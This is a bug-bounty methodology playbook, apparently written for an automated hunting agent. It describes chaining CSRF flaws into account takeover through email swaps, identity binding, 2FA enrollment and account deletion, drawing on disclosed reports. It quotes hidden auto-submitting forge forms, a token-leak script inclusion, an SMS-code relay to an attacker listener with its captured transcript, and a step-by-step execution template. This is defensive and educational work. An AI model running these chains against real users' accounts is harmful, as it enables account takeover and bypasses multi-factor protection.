---
title: "CSRF → Account Takeover — email-change, reset-link, 2FA-lane and deletion chains"
type: playbook
category: ato-chains
cwe: "CWE-352"
source_count: 13
full_bodies_available: 10 (+2 metadata-only: 84372, 90165)
corpus: "h1.security.nathan.sx roster (229 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-28"
note: "Anchor bodies: CSRF-6910 (IRCCloud, $500 list), CSRF-127703 (Badoo, $852 list), CSRF-155774 (Slack, $500 JSON). Claims trace to bodies read 2026-10-28."
---

# CSRF → ATO — the chains that pay

## 1. Overview

A settings-form CSRF is worth $100. A CSRF that ends with the attacker *owning the account* is
worth $280–$852 in this era and critical ratings. Thirteen corpus cases chain a plain CSRF
primitive into takeover; the chain families are:

| Chain | Cases | Primitive → Impact |
|---|---|---|
| email-change → password-reset | 6910, 7116, 152052, 101909 | attacker email into victim account → reset |
| identity/2FA binding | 127703, 141344, 155774, 90165, 84372/84395 | attacker Gmail/email/SMS/2FA into victim account |
| account destruction | 192131 | delete account + erase contacts |

**Case-ID scheme: `CSRF-<report id>`.**

## 2. The canonical chain — CSRF-6910 (IRCCloud, $500 list)

The whole chain in one body, verbatim steps:

> 1) Exploit a CSRF vulnerability in `/chat/user-settings`. An attacker creates a webpage on a
> (non-IRCCloud) website … and inserts a (hidden) form like this:
>
> ```html
> <form action="https://www.irccloud.com/chat/user-settings" method="post">
> <input type="hidden" name="email" value="[REDACTED_EMAIL]">
> <input type="hidden" name="realname" value="Doesn't Matter">
> <input type="hidden" name="hwords" value="">
> <input type="hidden" name="autoaway" value="1">
> <input type="hidden" name="reqid" value="1">
> <input type="hidden" name="session" value="">
> <input type="submit">
> <!-- some code to make the form submit automatically, in the  background-->
> </form>
> ```
> 3) The attacker will receive an e-mail to confirm the e-mail address (see: mail.png).
> 4) The attacker can now use the password reset functionality to change the password of the
> victim's account and gain full control over the account.

Agent lessons:

1. **The chain needs exactly two bugs**: one CSRF on an email/identity field, and a reset flow
   that trusts that email. Neither is critical alone; the pair is full ATO.
2. **Title says "password reset CSRF"; body says email-change CSRF.** The mislabel discipline
   applies inside reports too — read the steps, quote the steps.
3. **No token anywhere in the form** (`session` param empty, no crumb) — the settings endpoint
   is the whole bug.

### 2.1 Same family, other programs

- **CSRF-152052 (concrete5)** — profile save changes email/password without re-auth, PoC is a
  bare Burp-generated form with `uPasswordOld` **empty**:
  > You need to ask for confirming password for changing settings, or use a token everytime it
  > is changed.
  The empty old-password field is the report's actual thesis: **no step-up auth on sensitive
  change** (the hunt-mfa-bypass skill's pattern #1, pre-dated in this corpus).
- **CSRF-101909 (Ubiquiti account.ubnt.com)** — password change straight to attacker value;
  the fix line names both defenses:
  > 1st you need to enable the csrf_token of Django ; 2nd when change user information you may
  > ask the user for his current password.
- **CSRF-7116 (IRCCloud)** — title "CSRF to Account Take Over Bug"; same email-swap shape as
  the 6910 cluster.
- **CSRF-223367 (Weblate, medium claim)** — the activation-link binding variant: attacker
  registers, then the *victim uses the attacker's activation link while logged in* —
  *"the attacker's email will be added as a secondary email and the main full name will be
  changed"*. Body itself warns: *"adding a secondary email identity may turn into something
  more dangerous"*. Cross-vault row (excluded from XXE as pure CSRF).
- **CSRF-18698 (RelateIQ, $190 list)** — password-reset request with no CSRF token ("Resubmitted
  with POC #18685") — the reset-form half of the chain without the email-swap half; impact
  limited to forced resets until paired.

## 3. Binding chains — CSRF-127703 (Badoo, $852 list) — the leak-then-forge chain

The most original chain in the corpus. Badoo protects social-account linking with a per-session
`rt` parameter, and the body finds it **leaking inside a public service-worker script**:

> the only thing that protects from CSRF is the `rt` parameter which is unique for each
> user/session. I have noticed that the `rt` parameter is returned on almost all json responses
> so I tried to find a link that leaks it. After digging for a while, I have found this link
> `https://eu1.badoo.com/worker-scope/chrome-service-worker.js`, and I was surprised that it
> contains the `rt` parameter value!!
>
> ```javascript
> var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';
> ```

Then the forgery embeds the victim's own JS file to read the secret out of it:

```html
<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
```

Agent lessons:

1. **Per-session "secret" parameters are tokens** — treat any per-user value guarding state
   changes as a CSRF token and hunt for its leak surface (JS bundles, service workers, referers,
   JSON, analytics — see module 04).
2. **Same-origin script inclusion as exfil**: a `<script src>` to the victim origin lands the
   leaking file in the attacker page's execution context even without XSS — the service-worker
   file was fetched, parsed as JS, and its error/behavior mined.
3. Chain shape: *token leak (same-origin) → attacker completes OAuth as himself → victim's
   browser carries the forged verify URL with victim's `rt` → attacker identity bound.*

## 4. Provider-list binding — CSRF-141344 (onpatient, $50 list)

The binding target is an API array, and the PoC shows Burp's generated multipart form hitting a
JSON endpoint:

> Hi, I have found a CSRF issue that allows an attacker to link his email account to the
> victim's account and hijack the whole account by adding himself in the providers list.
> The link: `https://onpatient.com/api/v3/providers`

`POST /api/v3/providers` with attacker email in the providers array — after which the attacker
can log in *as a provider* into the victim's patient record. Impact claim is CRITICAL; paid
$50 — the corpus's starkest illustration that **chain payout tracks demonstrated access, not
claimed severity**.

## 5. The 2FA lane — CSRF-155774 (Slack, $500 JSON-verified)

Full MFA-bypass chain in one body. Root cause, verbatim:

> Root cause:
> ====================
> Server does not validate the existence or value of the **crumb** parameter containing the CSRF
> token.

The attack flow (from the body) is: attacker page forces `POST /account/settings/2fa_sms`
adding **attacker's** phone without a crumb → attacker's `nc` listener receives the SMS code
the site sends → the page's JavaScript relays it back into the victim's verify form. The banked
`nc` transcript shows the relay working end-to-end:

```
GET /a HTTP/1.1
Referer: http://192.168.1.82/slackcsrf.html
HTTP/1.1 200 OK

scode=196206;
```

Agent lessons:

1. **2FA settings without re-auth are an MFA-bypass class**, not a settings nuisance — the
   attacker becomes the second factor.
2. **The SMS-code relay is a same-page problem**: the forged page can both trigger the SMS
   (cross-site POST) and read the code (attacker phone) and submit it (cross-site POST) —
   three requests, one victim visit. Modern SameSite breaks the chain; era browsers didn't.
3. **CSRF-90165 (ok.ru, $500, metadata-only)** — backup-token retrieval CSRF, same lane; body
  withheld in the era export, recorded not quoted.

## 6. Execution template

```
STEP 1 — inventory sensitive-identity endpoints (authenticated):
  email/username change, password change (note: old-password required?),
  connected accounts, providers/delegates lists, 2FA enroll, account delete.
  record token presence per endpoint (crumb/csrftoken/authenticity_token).

STEP 2 — token-strip test per endpoint:
  replay with token empty/removed; 200 = no validation (141344/155774 lane).
  if 403: blank-referer + value-swap probes (module 05) before conceding.

STEP 3 — build the chain toward ATO:
  email-swap: attacker email in → does YOUR email receive the confirm?
  then: password-reset as the attacker-email owner → log in as victim.
  2FA-lane: attacker phone in → receive code → relay it back (JS on your page).

STEP 4 — two-account proof:
  victim B (test account) → attacker page → settings show attacker's email/phone
  → attacker logs into B via reset/2FA path. Screenshots each hop.

STEP 5 — restore state (kill-gate K7): revert emails, remove numbers, re-enable 2FA.
```

## 7. Validation gates (all must pass)

1. **End-to-end login as victim** from the attacker's browser (the 6910 standard) — not just
   the email-change.
2. **Every hop's request in evidence** with tokens redacted.
3. **The final impact is a takeover primitive**, not a settings mutation.
4. **No irrecoverable damage** to test accounts (192131's deletion lane: use a sacrificial
   account, never a real user's).
5. **SameSite reality check** (playbook P4): the chain must survive current-cookie defaults or
   the report must state the era/frame it works in.

## 8. Adjacency

- **Host-header poisoning of reset emails** — the reset-link half of the chain has its own
  class (Vault/Host-Header, row 24 pending).
- **No-step-up password change** — pairs with login-timing oracles (hunt-mfa-bypass pattern).
- **CSRF-192131 (Badoo, $280 JSON-verified)** — deletion lane; note its **JSON content-type
  body trick**, verbatim:
  > as the content-type was **json** so parser introduced "=" at the end of content in header,
  > but it was bypassed by adding _"ignore_me":"' value='test"
  — the JSON-in-form `=`-smuggling that zseano's guide teaches (byte-quoted in blogs-index §1).

## 9. Cross-references

- Module 01 — login-CSRF primitives; module 02 — binding via OAuth flows.
- Module 04 — the token-leak half of the 127703 chain.
- `hunt-csrf` skill Scenario A (ATO chains); `hunt-mfa-bypass` skill; `hunt-ato` skill chain map.
- [`references/blogs-index.md`](references/blogs-index.md) §3 — modern chain citations
  (Stripe #1483327 framework-wide CSRF middleware $5,000; GitLab GraphQL GET-mutations $3,370).
